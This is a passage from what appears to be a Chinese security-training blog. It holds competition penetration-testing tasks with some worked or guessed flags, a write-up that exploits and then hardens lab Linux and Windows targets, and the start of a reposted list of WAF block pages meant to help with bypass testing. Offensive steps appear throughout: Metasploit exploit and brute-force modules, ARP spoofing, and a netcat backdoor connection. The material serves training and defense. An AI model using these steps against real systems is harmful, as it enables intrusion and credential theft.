B-2）\n\n\\*任务说明：仅能获取Server4的IP地址\n\n1.通过本地PC中渗透测试平台Kali对靶机场景Server4进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；\n\n2.在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；\n\n3.在本地PC的渗透测试平台Kali中，打开MSF，使用db\\_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；\n\n4.在MSF工具中用search命令搜索搜索MS08067漏洞利用模块，将回显结果中的漏洞公开时间作为Flag值（如：2017-10-16）提交；\n\n5.在MSF工具中调用MS08067漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。\n\n  \n\n### B-5任务五：PE Reverse（国赛例卷6 B-8）\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\n2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\n3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag值并提交；\n\n4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交。\n\n  \n\n### B-6任务六：Web安全应用（无环境）\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.通过渗透机访问靶机的HTTP服务，扫描获取HTTP服务中的任务入口地址（使用字典directories.txt），并将任务入口的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n2.通过渗透机访问靶机的HTTP服务，并访问任务入口地址，分析页面内容并获得密码，将密码作为Flag值提交；\n\n3.通过渗透机访问靶机的HTTP服务，将题目2中获得的密码进行解密，由此访问新的任务入口，分析页面内容并获得密码，将密码作为Flag值提交；\n\n4.通过渗透机访问靶机的HTTP服务，将题目3中获得的密码进行解密，将解密后的密码作为Flag值提交；\n\n5.通过渗透机的火狐浏览器访问地址http://靶机IP/aredil/taherice.php，分析页面内容并获得密码，将密码作为Flag值提交；\n\n  \n\n### B-7任务七：数据库渗透测试（国赛例卷4 B-2）\n\n\\*任务说明：仅能获取Server7的IP地址\n\n1.在渗透机Kali2.0中使用zenmap工具扫描服务器场景Server7所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的1433、3306、80端口。并将该操作使用的命令中必须要使用的字符串作为Flag值提交；\n\n2.通过渗透机Kali2.0对服务器场景Server7进行系统服务及版本扫描渗透测试，并将该操作显示结果中数据库服务对应的服务端口信息作为Flag值提交；\n\n3.在渗透机Kali2.0中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称作为Flag值提交；\n\n4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为Flag值（之间以英文逗号分隔，例hello,test，..,..）提交；\n\n5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为Flag值提交；\n\n6.在msf模块中指定密码字典，字典路径为/root/2.txt爆破获取密码并将得到的密码作为Flag值提交；\n\n7.在msf模块中切换新的渗透模块，对服务器场景Server7进行数据库服务扩展存储过程进行利用，将调用该模块的命令作为Flag值提交；\n\n8.在上一题的基础上，使用第6题获取到的密码并进行提权，同时使用show options命令查看需要的配置，并配置CMD参数来查看系统用户，将配置的命令作为Flag值提交；\n\n9.在利用msf模块获取系统权限并查看目标系统的异常（黑客）用户，并将该用户作为Flag值提交。\n\n  \n\n### B-8任务八：Linux系统安全（国赛例卷3 B-8）\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server8进行系统服务及版本扫描渗透测试，并将该操作显示结果中22端口对应的服务版本信息字符串作为Flag值提交；\n\n2.找到/var/www目录中的图片文件，将文件名称作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.找到Flag3作为Flag值提交。\n\n  \n\n### B-9任务九：操作系统应急响应（无环境）\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.将黑客成功登录系统所使用的IP地址作为Flag值提交；\n\n2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；\n\n3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名作为Flag值提交；\n\n4.黑客对数据库进行了暴力破解，将最后一次暴力破解的时间作为Flag值提交；\n\n5.黑客在系统中隐藏了某个批处理文件，将该文件内容作为Flag值提交。\n\n  \n\n### B-10任务十：Web渗透测试\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.通过渗透机访问靶机HTTP服务，尝试上传或获取Web服务应用程序对应的木马类型，将木马应在位置（绝对目录）不变的部分作为Flag值提交；\n\n上传后页面应该有回显url 或burp抓包到repeater发送看有无回显url\n\n猜测FLAG:uploadedfile/\n\n无环境\n\n2.通过渗透机渗透靶机HTTP服务，将漏洞利用过程中对文件名修改的最关键部分字符串作为Flag提交；\n\n应该是前端对后缀名进行判断 将后缀改为php\n\n猜测FLAG:php\n\n无环境\n\n3.通过渗透机渗透靶机HTTP服务，将靶机的完整OS版本作为Flag值提交；\n\nnmap -O -n IP\n\nOS Detail:xxx\n\n猜测FLAG:xxx\n\n无环境\n\n4.通过渗透机渗透靶机HTTP服务，下载靶机Web根目录下无后缀名的文件，并将文件名作为Flag值提交；\n\n猜测通过一句话木马RCE查看根目录下无后缀名的文件\n\n猜测FLAG:passwd\n\n无环境\n\n5.分析并找到文件中的密码值，并将密码值作为Flag值提交；\n\n一句话木马cat一下即可\n\n猜测FLAG:xxx\n\n无环境\n\n6.将密码值解密后的明文作为Flag值提交。\n\n猜测MD5或用户哈希 用john 或 hashcat跑一下\n\n猜测FLAG:12345678\n\n无环境\n\n  \n\n# 国赛例卷10：\n\n### B-1任务一：主机发现与信息收集（国赛例卷5 B-10）\n\n\\*任务说明：仅能获取Server1的IP地址\n\n1.通过渗透机Kali2.0对靶机场景进行秘密FIN扫描 (使用Nmap工具)，并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\n2.通过渗透机Kali2.0对靶机场景进行秘密FIN扫描 (使用Nmap工具)，并将该操作显示结果中从下往上数第7行的端口信息作为Flag值提交；\n\n3.通过渗透机Kali2.0对靶机场景进行圣诞树（Xmas Tree）扫描（使用Nmap工具），并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\n4.通过渗透机Kali2.0对靶机场景进行圣诞树（Xmas Tree）扫描（使用Nmap工具），并将该操作显示结果中从下往上数第5行的服务名称作为Flag值提交；\n\n5.通过渗透机Kali2.0对靶机场景使用SYN包而不是用ACK包进行扫描渗透测试（使用Nmap工具），并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\n6.通过渗透机Kali2.0对靶机场景使用SYN包而不是用ACK包进行扫描渗透测试（使用Nmap工具），并将该操作显示结果中从下往上数第8行的服务状态作为Flag值提交；\n\n7.通过渗透机Kali2.0对靶机场景进行ACK和ICMP两种扫描类型并行的扫描渗透测试（使用Nmap工具）,并将该操作使用命令中必须要使用的参数作为Flag值提交；\n\n8.通过渗透机Kali2.0对靶机场景进行ACK和ICMP两种扫描类型并行的扫描渗透测试（使用Nmap工具）,并将该操作显示结果中从下往上数第3行的服务名称作为Flag值提交。\n\n  \n\n### B-2任务二：Windows操作系统渗透测试（国赛例卷3 B-9）\n\n\\*任务说明：仅能获取Server2的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server2进行系统服务及版本扫描渗透测试，并将该操作显示结果中1433端口对应的服务版本信息作为Flag值（例如3.1.4500）提交；\n\n2.通过本地PC中渗透测试平台Kali对服务器场景Server2进行系统服务及版本扫描渗透测试，将DNS服务器的主机完全合格域名作为Flag值提交；\n\n3.将目标服务器中SQL-Server数据库低权限（无法通过数据库执行指令系统命令）用户的密码作为Flag值提交；\n\n4.将目标服务器中SQL-Server数据库权限较高（可以通过数据库指令执行系统命令）用户的密码作为Flag值提交；\n\n5.找到C:\\\\Windows\\\\system32文件夹中266437文件夹中后缀为.docx的文件，将文档内容作为Flag值提交；\n\n\n\n### B-3任务三：数据分析数字取证\n\n\\*任务说明：仅能获取Server3的IP地址\n\n1.使用Wireshark查看并分析Server3桌面下的logs.pcapng数据包文件，通过分析数据包attack.pcapng找出恶意用户目录扫描的第9个文件，并将该文件名作为Flag值（形式：\\[robots.txt\\]）提交；\n\nhttp规则过滤：\n\n![](http://cdn.anyiblog.top/common/1649213885499-10d259d8-d6b7-4295-b216-425f1b98dda9.jpg)\n第九个文件：\n\n![](http://cdn.anyiblog.top/common/1649213886217-3f9af0e8-bb14-45a4-be76-85d1443c927c.jpg)\nFLAG:\\[star.php\\]\n\n2.继续查看数据包文件logs.pacapng，分析出恶意用户扫描了哪些端口，并将全部的端口作为Flag值（形式：\\[端口名1，端口名2，端口名3…，端口名n\\]）从低到高提交；\n\n过滤规则tcp.connection.syn and ip.addr==172.16.1.10\n\n![](http://cdn.anyiblog.top/common/1649213887082-31bc1e49-0c04-407e-9a75-20be8f465c39.jpg)\nFLAG:\\[21,80,445,1433,3306,3389,5000\\]\n\n3.继续查看数据包文件logs.pacapng分析出恶意用户读取服务器的文件名是什么，并将该文件名作为Flag值（形式：\\[robots.txt\\]）提交；\n\nhttp规则过滤 翻找一下除去404 not found的页面：\n\n![](http://cdn.anyiblog.top/common/1649213888451-a67e7b2c-d941-4309-806e-f3012846834e.jpg)\nFLAG:\\[name.txt\\]\n\n4.继续查看数据包文件logs.pacapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为Flag值（形式：\\[/root/whoami/\\]）提交；\n\n继续找：\n\n![](http://cdn.anyiblog.top/common/1649213889537-d75d1ee9-1e9d-470b-ac5b-5e2d44b8b74f.jpg)\nFLAG:\\[C:/phpstudy/www/\\]\n\n5.继续查看数据包文件logs.pacapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为Flag值（形式：\\[一句话密码\\]）提交；\n\n![](http://cdn.anyiblog.top/common/1649213891550-2d682fc6-a673-46ce-803b-f84ad08ba0f9.jpg)\nFLAG:007\n\n6.继续查看数据包文件logs.pacapng分析出恶意用户下载了什么文件，并将文件名及后缀作为Flag值（形式：\\[文件名.后缀名\\]）提交；\n\n在http为POST请求包里找\n\n![](http://cdn.anyiblog.top/common/1649213892401-59c13029-10f6-4483-ac44-97ab38bd32a3.jpg)\nFLAG:\\[flag.zip\\]\n\n7.继续查看数据包文件logs.pacapng将恶意用户下载的文件里面的内容作为Flag值（形式：\\[文件内容\\]）提交。\n\n追踪该流：\n\n![](http://cdn.anyiblog.top/common/1649213894170-db220ebf-7e2b-4ad6-a16f-18fb9ee2b42f.jpg)\n内容：\n\n![](http://cdn.anyiblog.top/common/1649213894706-d553b983-85d7-43b0-b69c-6ff466853235.jpg)\nflag.zip里的文件为flag.txt 内容为flag{Find You!}\n\nFLAG:\\[flag{Find You!}\\]\n\n  \n\n### B-4任务四：中间人攻击渗透测试（国赛例卷5 B-7）\n\n\\*任务说明：仅能获取Server4的IP地址\n\n\\*任务说明：仅能获取Server11的IP地址\n\n1.通过上题渗透后得到控制权限的服务器场景Server4进行查看本地的arp缓存表的操作，并将该操作所使用的命令作为Flag值提交；\n\n2.通过上题渗透后得到控制权限的服务器场景Server4进行清除本地的arp缓存表的操作，并将该操作所使用的命令作为Flag值提交；\n\n3.通过本地PC中渗透测试平台Kali对服务器场景Server4以及服务器场景Server11进行中间人攻击渗透测试，打开渗透测试平台Kali的路由转发功能，并将该配置文件的绝对路径作为Flag值提交；\n\n4.通过本地PC中渗透测试平台Kali对服务器场景Server4以及服务器场景Server11进行中间人攻击渗透测试，通过arpspoof命令对客户端（Server4）以及服务器（Server11）进行arp污染 ，并将该操作必须要用到的参数作为Flag值提交；\n\n5.中间人渗透攻击成功后，渗透测试平台kali能够监听到客户端（Server4）向服务器（Server11）中的login.php页面提交的登陆网站用户名，密码信息，使用服务器场景Server4桌面上的Chrome浏览器，访问Server11服务器场景的Web站点[http://Linux](http://linux/)靶机ip/login.php，使用已经保存好的用户名，密码直接登录，并在kali上使用抓包软件wireshark进行抓包，设置wireshark过滤规则，过滤所有请求方式为POST的http请求包，将需要使用的过滤器表达式作为Flag值（\\==符号前后不要加空格）提交；\n\n6.分析抓到的POST请求包，并将POST请求内容中客户端（Server4）向服务器（Server11）中的login.php页面提交的登陆网站admin用户的密码作为Flag值提交。  \n\n  \n\n### B-5任务五：Windows系统安全（国赛例卷4 B-4）\n\n\\*任务说明：仅能获取Server5的IP地址\n\n1.通过本地PC中渗透测试平台Kali对服务器场景Server5进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务状态信息字符串作为Flag值提交；\n\n2.将首选DNS服务器地址作为Flag值提交；\n\n3.找到Flag1作为Flag值提交；\n\n4.找到Flag2作为Flag值提交；\n\n5.将系统最高权限管理员账户的密码作为Flag值提交。  \n\n  \n\n### B-6任务六：渗透测试（国赛例卷3 B-2）\n\n\\*任务说明：仅能获取Server6的IP地址\n\n1.在MSF工具中用search命令搜索MS12020 RDP拒绝服务攻击模块，将回显结果中的漏洞披露时间作为Flag值（如：2012-10-16）提交；\n\n2.在MSF工具中调用MS12020 RDP拒绝服务漏洞的辅助扫描模块，将调用此模块的命令作为Flag值提交；\n\n3.使用set命令设置目标IP，并检测靶机是否存在漏洞，运行此模块，将回显结果中倒数第2行的最后一个单词作为Flag值提交；\n\n4.在MSF工具中调用并运行MS12020 RDP拒绝服务漏洞的攻击模块，将运行此模块后回显结果中倒数第1行的最后一个单词作为Flag值提交；\n\n5.进入靶机关闭远程桌面服务，再次运行MS12020\n\nRDP拒绝服务漏洞的攻击模块，运行此模块并将回显结果中倒数第2行的最后一个单词作为Flag值提交。\n\n  \n\n### B-7任务七：Web安全应用（国赛例卷5 B-3）\n\n\\*任务说明：仅能获取Server7的IP地址\n\n1.通过渗透机扫描靶机中运行的服务，将完整的HTTP服务名称作为Flag值提交；\n\n2.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/rececit/enehevibo.php，通过密码破译得到明文密码，并将明文密码作为Flag值提交；\n\n3.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/irascence/futuresive.php，通过密码破译得到明文密码，并将明文密码作为Flag值提交；\n\n4.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/economyia/tortly.php，通过密码破译进入新的页面，并将新页面的URL地址作为Flag值（形式：[http://172.16.1.1/](http://172.16.1.1/)页面路径）提交；\n\n5.在新的页面中，通过解密页面内容获得密码，并将密码作为Flag值提交；\n\n6.通过渗透机访问靶机的HTTP服务（使用火狐浏览器），URL为http://靶机IP/corticory/heseur.php，通过解密页面内容得到密码，并将密码作为Flag值提交。  \n\n  \n\n### B-8任务八：文件MD5校验（国赛例卷1 B-5）\n\n\\*任务说明：仅能获取Server8的IP地址\n\n1.进入虚拟机操作系统：Server8中的/root目录，找到test.txt文件，并使用md5sum工具来计算出该文件的md5值，并将计算该文件md5的命令的字符串作为Flag值提交；\n\n2.进入虚拟机操作系统：Server8中的/root目录，找到test.txt文件，并使用md5sum校验工具来计算出该文件的md5值，并将计算该文件得到的md5值的字符串中前6位作为Flag值提交；\n\n3.进入虚拟机操作系统：Server8中的/root目录，将test.txt文件的文件名称改为txt.txt，然后再使用md5sum工具计算txt.txt文件的md5值，并将计算该文件得到的md5值的字符串中前5位数字和之前test.txt文件md5值的字符串中前5位数字相减的结果作为Flag值提交；\n\n4.进入虚拟机操作系统：Server8，使用md5sum工具来计算/etc/passwd文件的md5值，并将改md5值导入到passwd.md5文件中，并将该命令的字符串作为Flag值提交；\n\n5.进入虚拟机操作系统：Server8，创建一个新的用户，用户名为user6，密码为123456。再次计算/etc/passwd的md5值，并将该值与passwd.md5文件中的值进行对比，并将添加用户后/etc/passwd文件的md5值的字符串中前三位数字和之前/etc/passwd文件md5值的字符串中前三位数字相减的结果作为Flag值提交。  \n\n  \n\n### B-9任务九：PE Reverse（国赛例卷6 B-8）\n\n\\*任务说明：仅能获取Server9的IP地址\n\n1.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将main函数的入口地址作为Flag值提交；\n\n2.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该二进制文件中检查许可证的关键函数作为Flag值提交；\n\n3.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，找到Flag1值并提交；\n\n4.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，尝试破解该二进制文件，将注册成功后的回显信息作为Flag值提交；\n\n5.对靶机服务器场景桌面上的PE01.exe二进制文件进行静态调试，将该激活所需的许可证码作为Flag值提交；  \n\n### B-10任务十：应急响应（国赛例卷3 B-10）\n\n\\*任务说明：仅能获取Server10的IP地址\n\n1.黑客通过网络攻入本地服务器，在Web服务器的主页上外挂了一个木马连接，请你找到此连接并删除该连接，将对应的标题名称作为Flag值提交;\n\n2.黑客攻入本地的数据库服务器，并添加了除admin以外的具有一个管理员权限的超级用户，将此用户的密码作为Flag值提交;\n\n3.黑客攻入本地服务器，在本地服务器建立了多个超级用户，请你删除除了Administrator用户以外的其他超级管理员用户，然后在命令行窗口输入net user，将Administrator右边第一个单词作为Flag值提交;\n\n4.黑客修改了服务器的启动内容，请你删除不必要的启动项程序，将该启动项程序的名称作为Flag值（如有多个名称之间以英文逗号分隔，如：hello,test）提交;\n\n5.黑客在服务器某处存放了一个木马程序，请你找到此木马程序并清除木马，将木马文件名作为Flag值提交。","tags":["刷题"],"categories":["刷题笔记","中职"]},{"title":"D模块加固","url":"/2022/03/28/20220328/","content":"# D模块linux靶机加固：\n\n## 漏洞发现：\n\n使用攻击机kali nmap -n -sV 172.13.2.249扫描得到\n\n![](http://cdn.anyiblog.top/common/1648471267276-4b205f8c-bb6c-4f36-b82b-c241ab7094b5.png)\n\n可能存在以下漏洞：\n\n- 笑脸漏洞 vsftpd2.3.4\n- Samba漏洞 is\\_known\\_pipename\n- Mysql弱口令\n- 后门端口\n\n## 漏洞验证与复现过程：\n\n### 笑脸漏洞 vsftpd2.3.4\n\nftp连接目标靶机后发现只允许匿名登录 因此触发不了笑脸漏洞\n\n![](http://cdn.anyiblog.top/common/1648471162713-64a4bac1-90a8-4221-83db-3c6012ce21e3.png)\n\n### Samba漏洞 is\\_known\\_pipename\n\n![](http://cdn.anyiblog.top/common/1648471300215-50b948ff-13d7-4cc9-ab1e-7e0bf8de7c42.png)\t\nmsfconsole下使用search该模块名后使用该模块use exploit/linux/samba/is\\_known\\_pipename\n\nset rhosts &lt;IP&gt;设置目标靶机后run发现可以打通\n\n![](http://cdn.anyiblog.top/common/1648471388183-9007c715-8f30-4b40-aa83-becce54ddbf3.png)\n\n拿到了shell且为root权限\n\n![](http://cdn.anyiblog.top/common/1648471401095-beb6bd53-f578-408c-bb39-ccc87dc0dc6b.png)\n\n### Mysql弱口令\n\nmysql密码不是默认的rootroot需要使用字典来爆破\n![](http://cdn.anyiblog.top/common/1648471407075-e785db2e-40d5-4a1f-9400-ecf93ed70da9.png)\n\nmsfconsole -&gt; search mysql\\_login -&gt; use auxiliary/scanner/mysql/mysql\\_login\n\n![](http://cdn.anyiblog.top/common/1648471415397-942591dc-47d5-4693-bbd8-4a82ae4903c2.png)查看需设置的选项 其中PASS\\_FILERHOSTSTHREADS设置即可 分别设置为爆破字典、目标靶机、线程数\n\n![](http://cdn.anyiblog.top/common/1648471422362-6af79527-eff8-4729-9d7b-6fbc89bef2f9.png)\n\nrun运行得到mysql密码\n\n![](http://cdn.anyiblog.top/common/1648471427969-5ff95731-701c-4aa8-9649-8088688a6bde.png)\n\n存在弱口令root aaacab\n\n### 后门端口\n\nnc 172.13.2.249 10010后直接得到shell \n\n## 加固与修复方案：\n\n不论有没有对应的服务，拿到靶机先修改密码以及删除后门用户：拿到账户后更改root账号密码 大写、符号、数字\n\n![](http://cdn.anyiblog.top/common/1648471459657-731efcaf-212b-4553-b321-7edeb286d048.png)\n\n发现drgsup836、amercn416可疑用户\n\n![](http://cdn.anyiblog.top/common/1648471478685-305bf3e1-8adc-4d07-bb00-b2c0c9270eb4.png)\n\n![](http://cdn.anyiblog.top/common/1648471510300-96176c35-773b-45bd-963f-5e4e9ee07f79.png)\n\n删除后门用户\n\n经验证，存在的漏洞包括：Samba漏洞、Mysql弱口令、后门端口\n\n### Samba漏洞\n\n修复方案：\n\n- 升级samba版本\n- 修改配置文件\n\n执行命令vim/etc/samba/smb.conf\n![](http://cdn.anyiblog.top/common/1648471539105-5f436f3e-c51b-4901-9722-9c553463552c.png)\n\nvim下 /global找到global下的节点\n![](http://cdn.anyiblog.top/common/1648471558508-40949eee-6050-41a6-97ca-3270fc484417.png)\n\n在节点下添加 nt pipe support = no\n\n![](http://cdn.anyiblog.top/common/1648471569531-a83ac672-6113-49ce-984f-0a7f5a5c6a29.png)\n\nwq保存后重启服务\n![](http://cdn.anyiblog.top/common/1648471575706-f191e80f-93d9-49f1-b7f2-29deee495c6c.png)\n\n漏洞验证：\n\n![](http://cdn.anyiblog.top/common/1648471603526-db162643-0040-4aaf-981a-d3162e7e9fc0.png)\n\n攻击失效，修复成功。\n\n### Mysql弱口令\n\n修复方案：\n\n- 修改数据库密码\n\n因为centos这个版本没有mysqladmin 所以选择进入数据库进行修改密码\n\n进入数据库mysql -uroot -p\n\n![](http://cdn.anyiblog.top/common/1648471627189-cc104900-f83a-4845-88f8-a58a92c8ec54.png)\n\nupdate mysql.user set password=password(&#39;Passwd&#39;) where user =&#39;USER&#39;;\n\n![](http://cdn.anyiblog.top/common/1648471642055-f37be0ee-df92-448c-8d0d-5ba51eb17083.png)\n\n或set password for &#39;root&#39;@&#39;localhost&#39;=password(&#39;Passwd&#39;);\n\n更新后flush privileges;刷新服务\n\n![](http://cdn.anyiblog.top/common/1648471644986-90b5cd51-8028-4d72-9dce-f5b3b827334b.png)\n\n漏洞验证：\n\n使用我们新密码成功登录\n![](http://cdn.anyiblog.top/common/1648471664622-c6928b0b-b6cf-476e-a9e3-fb959ffddde3.png)\n\n旧密码登陆错误\n![](http://cdn.anyiblog.top/common/1648471683977-735a12c5-822e-4b1d-b5b7-02ac30bebedf.png)\n\nKALI攻击失败：\n![](http://cdn.anyiblog.top/common/1648471693155-d4ccd2fe-7166-4019-80f7-4b1774123ad1.png)\n\n### 后门端口\n\n经扫描得到我们的端口是10010为bashshell即我们的后门端口\n\n修复方案：\n\n- 杀死端口进程号\n\n在靶机输入netstat -tuanp|grep 10010找到其PID然后pkill -9 PID即可\n\n漏洞验证：\n\n![](http://cdn.anyiblog.top/common/1648471701572-9eae999c-ea19-4baf-a2bf-3f0219778a46.png)\n攻击机连接失败。\n\n# D模块windows靶机加固：\n\n## 漏洞发现：\n\n使用攻击机kali nmap -n -sV 172.13.2.250扫描得到\n\n![](http://cdn.anyiblog.top/common/1648471726273-0ab4b569-f516-4667-bea1-45a74b3150d2.png)\n\n可能存在以下漏洞：\n\n- 后门用户\n- 管理员用户弱口令\n- IIS内核缓存\n- ms17_010\n- ms12_020打3389蓝屏\n\n## 漏洞验证与复现过程：\n\n暂无环境。\n\n## 加固与修复方案：\n\n### 后门用户\n\n修复方案：\n\n- cmd命令行删除：net user hacker /del\n- 注册表删除\n\n注册表删除的操作如下：\n\ncompmgmt.msc -> 本地用户和组 -> 用户 -> 删除后门用户\n\n![](http://cdn.anyiblog.top/common/1648557523540-49ac8681-ef55-4588-b15a-d7e9e47b67fd.png)\n\n### 管理员用户弱口令\n\n修复方案：\n\n- cmd命令行修改密码： net user administrator P@ssW0rd\n- 注册表修改\n\n注册表修改的操作如下：\n\ncompmgmt.msc -> 本地用户和组 -> 用户 -> Administrator -> 设置高强度密码\n\n![](http://cdn.anyiblog.top/common/1648557591557-5e52310f-4cd5-42ab-9458-ee67e30ec772.png)\n\n### IIS内核缓存\n\n修复方案：\n\n- 禁用IIS内核缓存，避免MS15_034\n\nIIS -> 网站 -> 输出缓存 -> 禁用内核缓存\n\n![](http://cdn.anyiblog.top/common/1648557692456-b99d6b5c-568b-4b25-859f-3101de429224.png)\n\n漏洞验证：\n\n![](http://cdn.anyiblog.top/common/1648557717139-9af7b545-1bdf-493a-8344-b7c18567e860.png)\n\nMS15_034攻击失败，加固成功。\n\n### ms17_010\n\n修复方案：\n\n- 关闭相应服务，避免MS17_010\n\nservice -> Server -> 禁用\n\n![](http://cdn.anyiblog.top/common/1648557908625-85df0b83-bbe6-49c3-ac5e-17634b88db9e.png)\n\n漏洞验证：\n\n![](http://cdn.anyiblog.top/common/1648557941110-077ace4c-d415-452b-b150-c36033617e0e.png)\n\nMS17_010攻击失败，加固成功。\n\n### ms12_020漏洞\n\n修复方案：\n\n- 关闭远程3389端口\n\n计算机 -> 系统属性 -> 远程 -> 不允许远程连接到此计算机\n\n![](http://cdn.anyiblog.top/common/1648558198031-f3f74423-1a81-4ec9-af1c-07e0c03ca02d.png)\n\n漏洞验证：\n\n![](http://cdn.anyiblog.top/common/1648558211769-20ea1690-9f23-4b3a-a838-8d00f856f129.png)\n\nMS12_020攻击失败，加固成功。\n\n","tags":["刷题"],"categories":["刷题笔记","中职"]},{"title":"【转载】常见WAF拦截页面","url":"/2022/03/17/20220317/","content":"\n# 转载说明\n\n原文地址：https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247491052&idx=1&sn=4d55ded38229cf6d84fb2b45b75f8082&chksm=ec1f48d3db68c1c5dcf4a5cddc504251c9abaacfb9e202fdc3d242215d29b3cc2da7932a113c&mpshare=1&scene=23&srcid=03171XVzujdcDemiU1wFOnRM&sharer_sharetime=1647483397365&sharer_shareid=f4ba1e82d3d9cd54c0ac5b91220816de#rd\n\n转载自 HACK学习呀 公众号，来源自 潇湘信安 公众号。\n\n本文转载学习目的，有任何侵权可联系删除。\n\n# 前言\n\n去年年底看到@madcoding老哥博客的“Waf的识别与绕过”一文中搜集了不少WAF拦截页面，正好我平时也有搜集WAF拦截页面的习惯，所以结合他的一起整理成了这么一篇文章，便于自己日后遇到WAF时好查询，并进行针对性的绕过测试！！！\n\n现如今WAF种类繁多，笔者搜集的可能也并不是那么齐全和准确，还望得到各位老哥的补充和修正！！！\n\n# WAF\n\n## (1) D盾\n\n![](https://c.img.dasctf.com/images/2022317/1647483977397-f6e347ff-cb0f-4a48-873f-d0efd62a8a94)\n\n\n## (2) 云锁\n\n![](https://c.img.dasctf.com/images/2022317/1647483984521-820e53cc-1df5-4287-9156-168322584847)\n\n## (3) UPUPW安全防护\n\n![](https://c.img.dasctf.com/images/2022317/1647483991555-3a645b97-30fd-4c35-beda-a1f40a630620)\n\n## (4) 宝塔网站防火墙\n\n![](https://c.img.dasctf.com/images/2022317/1647484016202-d96f79df-6eee-4008-83fd-1806436d5078)\n\n## (5) 网防G01\n\n![](https://c.img.dasctf.com/images/2022317/1647484021700-673e3d06-b541-418d-9543-351d2c64bd8a)\n\n\n## (6) 护卫神\n\n![](https://c.img.dasctf.com/images/2022317/1647484029774-a8bf19f3-0bb7-4e31-93cb-1dcaf61fcf3f)\n\n\n## (7) 网站安全狗\n\n![](https://c.img.dasctf.com/images/2022317/1647484037000-8e3ea4fe-1b4f-4086-8202-c954afac15b8)\n\n\n## (8) 智创防火墙\n\n![](https://c.img.dasctf.com/images/2022317/1647484041233-4220d5b0-d290-4403-9d19-41249aceb804)\n\n\n## (9) 360主机卫士或360webscan\n\n![](https://c.img.dasctf.com/images/2022317/1647484048042-2aa46de3-d92a-4545-8813-563f71299a47)\n\n\n## (10) 西数WTS-WAF\n\n![](https://c.img.dasctf.com/images/2022317/1647484087336-36c60b7d-2238-49e0-8e78-2f711c4ec57b)\n\n\n## (11) Naxsi WAF \n\n![](https://c.img.dasctf.com/images/2022317/1647484091282-af3ba978-69eb-4af7-8cd3-99e98b4b4d51)\n\n\n## (12) 腾讯云 \n\n![](https://c.img.dasctf.com/images/2022317/1647484095541-1d4eef51-8c38-4382-88e7-7c6f30d7db2e)\n\n\n## (13) 腾讯宙斯盾 \n\n![](https://c.img.dasctf.com/images/2022317/1647484100612-dc14bdbe-16d8-49ec-81d1-3fea81c5551a)\n\n\n## (14) 百度云 \n\n![](https://c.img.dasctf.com/images/2022317/1647484105267-0df58ec7-2081-40e9-b28a-85442b07f159)\n\n\n## (15) 华为云\n\n![](https://c.img.dasctf.com/images/2022317/1647484109391-0d465232-82f1-49ae-961d-78a3cdbaab6b)\n\n\n## (16) 网宿云\n\n![](https://c.img.dasctf.com/images/2022317/1647484114796-689c8c27-6553-468a-ab9d-27c324511937)\n\n\n## (17) 创宇盾 \n\n![](https://c.img.dasctf.com/images/2022317/1647484119607-0e9e5037-91ba-45fb-84ba-0dfd927aac9e)\n\n\n## (18) 玄武盾\n\n![](https://c.img.dasctf.com/images/2022317/1647484124308-8281455c-511a-42f8-9980-206f4e8de948)\n\n\n## (19) 阿里云盾 \n\n![](https://c.img.dasctf.com/images/2022317/1647484129278-aa43e5b8-22e2-4b9b-a230-4768df0beb21)\n\n\n## (20) 360网站卫士 \n\n![](https://c.img.dasctf.com/images/2022317/1647484132946-3ec648fa-0416-4591-9924-d30940949109)\n\n## (21) 奇安信网站卫士 \n\n![](https://c.img.dasctf.com/images/2022317/1647484138283-1b72b095-e910-4f30-8b95-072a8ecb3a08)\n\n\n## (22) 安域云WAF\n\n![](https://c.img.dasctf.com/images/2022317/1647484141736-857b948d-68cb-4bfb-a8fc-038e6aba3185)\n\n## (23) 